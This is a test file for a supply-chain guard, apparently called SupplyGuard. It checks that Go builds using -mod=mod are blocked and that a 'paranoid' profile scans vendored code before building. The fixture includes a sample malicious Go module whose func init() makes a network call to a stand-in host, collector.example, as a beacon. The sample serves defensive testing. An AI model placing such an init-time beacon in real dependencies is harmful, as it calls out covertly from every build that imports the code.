/**
 * M11: blast radius — the hermetic build gate and vendor quarantine.
 *
 * Assume the human approved the wrong thing; what limits the damage?
 * `-mod=mod` must not un-enforce the vendor model one flag early, and in
 * paranoid the vendored code a build would compile is content-scanned first.
 */
import assert from "node:assert/strict";
import { mkdir, mkdtemp, rm, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { after, test } from "node:test";

import { createGoAdapter } from "../../src/adapters/go/index.ts";
import { createAdapterRegistry } from "../../src/adapters/registry.ts";
import { createGenericAdapter } from "../../src/generic/index.ts";
import { createRuntime, type SupplyGuardRuntime } from "../../src/index.ts";

const tempRoots: string[] = [];

after(async () => {
  await Promise.all(tempRoots.map((dir) => rm(dir, { recursive: true, force: true })));
});

const MALICIOUS = [
  "package evil",
  "",
  "func init() {",
  "  http.Get(\"https://collector.example/ping\")",
  "}",
].join("\n");

const CLEAN = "package good\n\nfunc G() {}\n";

interface Harness {
  runtime: SupplyGuardRuntime;
  ctx: never;
  prompts: string[];
  call(command: string): Promise<{ block?: boolean; reason?: string } | undefined>;
}

async function harness(options: {
  profile?: string;
  evil?: boolean;
}): Promise<Harness> {
  const repo = await mkdtemp(join(tmpdir(), "supplyguard-m11-"));
  const home = await mkdtemp(join(tmpdir(), "supplyguard-m11-home-"));
  tempRoots.push(repo, home);

  if (options.profile !== undefined) {
    await writeFile(join(repo, ".supplyguard.yaml"), `version: 1\nprofile: ${options.profile}\n`);
  }

  const module = options.evil === true ? "github.com/evil/pkg" : "github.com/good/pkg";
  await writeFile(
    join(repo, "go.mod"),
    `module example.com/app\n\ngo 1.22\n\nrequire ${module} v1.0.0\n`,
  );
  await writeFile(
    join(repo, "go.sum"),
    `${module} v1.0.0 h1:abc=\n${module} v1.0.0/go.mod h1:def=\n`,
  );
  const vendorDir = join(repo, "vendor", ...module.split("/"));
  await mkdir(vendorDir, { recursive: true });
  await writeFile(join(vendorDir, options.evil === true ? "beacon.go" : "good.go"), options.evil === true ? MALICIOUS : CLEAN);
  await writeFile(
    join(repo, "vendor", "modules.txt"),
    `# ${module} v1.0.0\n## explicit; go 1.22\n${module}\n`,
  );

  const prompts: string[] = [];
  const runtime = createRuntime({
    home,
    env: {},
    registry: createAdapterRegistry([
      createGenericAdapter(),
      createGoAdapter({ env: { GOPROXY: "off" } }),
    ]),
  });
  const ctx = {
    cwd: repo,
    hasUI: true,
    mode: "tui" as const,
    ui: {
      select: async (title: string) => {
        prompts.push(title);
        return "Deny";
      },
      confirm: async () => false,
      input: async () => "a reason",
      notify: () => {},
    },
    sessionManager: { getSessionId: () => "session-1" },
  };

  return {
    runtime,
    ctx: ctx as never,
    prompts,
    call: (command: string) =>
      runtime.onToolCall({ toolName: "bash", toolCallId: "1", input: { command } }, ctx as never),
  };
}

test("-mod=mod on a build command with a vendor tree is denied in every profile", async () => {
  const h = await harness({});
  await h.call("ls"); // baseline

  for (const command of [
    "go build -mod=mod ./...",
    "GOFLAGS=-mod=mod go test ./...",
    "sh -c 'go vet -mod=mod ./...'",
  ]) {
    const blocked = await h.call(command);
    assert.equal(blocked?.block, true, command);
    assert.match(blocked?.reason ?? "", /-mod=mod/);
  }
});

test("building from the reviewed vendor tree stays free", async () => {
  const h = await harness({});
  await h.call("ls");
  assert.equal(await h.call("go build ./..."), undefined);
  assert.equal(await h.call("GOFLAGS=-mod=vendor GOPROXY=off go test ./..."), undefined);
});

test("paranoid content-scans the vendored code before the first build runs it", async () => {
  const h = await harness({ profile: "paranoid", evil: true });
  await h.call("ls");

  const blocked = await h.call("go build ./...");
  assert.equal(blocked?.block, true, "an ask answered Deny blocks the build");
  assert.match(
    h.prompts.join("\n\n"),
    /network call inside func init/,
    "the quarantine scan's finding is what the human reads",
  );
});

test("a clean vendored tree builds in paranoid once scanned", async () => {
  const h = await harness({ profile: "paranoid" });
  await h.call("ls");
  // First build triggers the quarantine scan of the clean module: nothing to
  // ask about, so the call passes.
  assert.equal(await h.call("go build ./..."), undefined, "clean vendored code builds");
  assert.equal(await h.call("go test ./..."), undefined);
});
